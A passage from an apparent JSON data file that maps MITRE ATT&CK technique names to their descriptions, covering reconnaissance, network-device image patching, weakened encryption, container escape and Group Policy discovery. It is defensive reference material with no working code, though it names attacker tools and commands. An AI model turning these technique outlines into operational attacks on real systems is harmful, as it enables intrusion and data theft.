    "Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).(Citation: ArsTechnica Intel) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190))."
  ],
  "active scanning": [
    "Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.\n\nAdversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.(Citation: Botnet Scan)(Citation: OWASP Fingerprinting) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190))."
  ],
  "active scanning: wordlist scanning": [
    "Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to [Brute Force](https://attack.mitre.org/techniques/T1110), its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591), or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).\n\nFor example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website\u2019s pages and directories.(Citation: ClearSky Lebanese Cedar Jan 2021) This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [Brute Force](https://attack.mitre.org/techniques/T1110)).  \n\nAs cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.(Citation: S3Recon GitHub)(Citation: GCPBucketBrute) Once storage objects are discovered, adversaries may leverage [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530) to access valuable information that can be exfiltrated or used to escalate privileges and move laterally. "
  ],
  "search open technical databases": [
    "Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS)(Citation: Medium SSL Cert)(Citation: SSLShopper Lookup)(Citation: DigitalShadows CDN)(Citation: Shodan)\n\nAdversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))."
  ],
  "search open technical databases: dns/passive dns": [
    "Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts.\n\nAdversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))."
  ],
  "search open technical databases: whois": [
    "Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.(Citation: WHOIS)\n\nAdversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))."
  ],
  "search open technical databases: digital certificates": [
    "Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.\n\nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.(Citation: SSLShopper Lookup) Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).(Citation: Medium SSL Cert) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))."
  ],
  "search open technical databases: cdns": [
    "Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor\u2019s geographical region.\n\nAdversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization\u2019s website.(Citation: DigitalShadows CDN) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Drive-by Compromise](https://attack.mitre.org/techniques/T1189))."
  ],
  "search open technical databases: scan databases": [
    "Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.(Citation: Shodan)\n\nAdversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190))."
  ],
  "search closed sources": [
    "Adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data.(Citation: D3Secutrity CTI Feeds) Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.(Citation: ZDNET Selling Data)\n\nAdversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078))."
  ],
  "search closed sources: threat intel vendors": [
    "Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.(Citation: D3Secutrity CTI Feeds)\n\nAdversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [External Remote Services](https://attack.mitre.org/techniques/T1133))."
  ],
  "network boundary bridging": [
    "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments."
  ],
  "network boundary bridging: network address translation traversal": [
    "Adversaries may bridge network boundaries by modifying a network device\u2019s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918)\n\nWhen an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  \n\nAdversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities"
  ],
  "weaken encryption": [
    "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)"
  ],
  "weaken encryption: reduce key space": [
    "Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.(Citation: Cisco Synful Knock Evolution)\n\nAdversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.\n\nAdversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601) to change the configuration of the device. (Citation: Cisco Blog Legacy Device Attacks)"
  ],
  "weaken encryption: disable crypto hardware": [
    "Adversaries disable a network device\u2019s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.\n\nMany network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco Blog Legacy Device Attacks)"
  ],
  "modify system image": [
    "Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.\n\nTo change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device."
  ],
  "modify system image: patch system image": [
    "Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.(Citation: Killing the myth of Cisco IOS rootkits) (Citation: Killing IOS diversity myth) (Citation: Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation: Juniper Netscreen of the Dead) Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.\n\nTo change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.\n\nTo change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.\n\nIn the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.\n\nBy modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600), authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004), and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).  Adding new capabilities for the adversary\u2019s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001), [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port Knocking](https://attack.mitre.org/techniques/T1205/001).\n\nAdversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. \n\nWhen the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005). \n\nWhen the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) to achieve persistence. "
  ],
  "modify system image: downgrade system image": [
    "Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. (Citation: Cisco Synful Knock Evolution)\n\nOn embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.\n\nDowngrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600).  Downgrading of a system image can be done on its own, or it can be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001).  "
  ],
  "data from configuration repository": [
    "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)"
  ],
  "data from configuration repository: snmp (mib dump)": [
    "Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) "
  ],
  "data from configuration repository: network device configuration dump": [
    "Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. "
  ],
  "stage capabilities: link target": [
    "Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)) or a phish to gain initial access to a system (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)), an adversary must set up the resources for a link target for the spearphishing link. \n\nTypically, the resources for a link target will be an HTML page that may include some client-side script such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003).(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019) Adversaries may also [Upload Malware](https://attack.mitre.org/techniques/T1608/001) and have the link target point to malware for download/execution by the user.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Link shortening services can also be employed. Adversaries may also use free or paid accounts on Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked.(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)(Citation: Intezer App Service Phishing)"
  ],
  "container administration command": [
    "Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.(Citation: Docker Daemon CLI)(Citation: Kubernetes API)(Citation: Kubernetes Kubelet)\n\nIn Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container.(Citation: Docker Entrypoint)(Citation: Docker Exec) In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.(Citation: Kubectl Exec Get Shell)"
  ],
  "deploy container": [
    "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment.\n\nContainers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow.(Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)"
  ],
  "escape to host": [
    "Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)\n\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host\u2019s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host."
  ],
  "build image on host": [
    "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote <code>build</code> request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.(Citation: Docker Build Image)\n\nAn adversary may take advantage of that <code>build</code> API to build a custom image on the host that includes malware downloaded from their C2 server, and then they then may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.(Citation: Aqua Build Images on Hosts)(Citation: Aqua Security Cloud Native Threat Report June 2021) If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it\u2019s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment. "
  ],
  "group policy discovery": [
    "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predicable network path <code>\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\</code>.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)\n\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit."
  ]
}
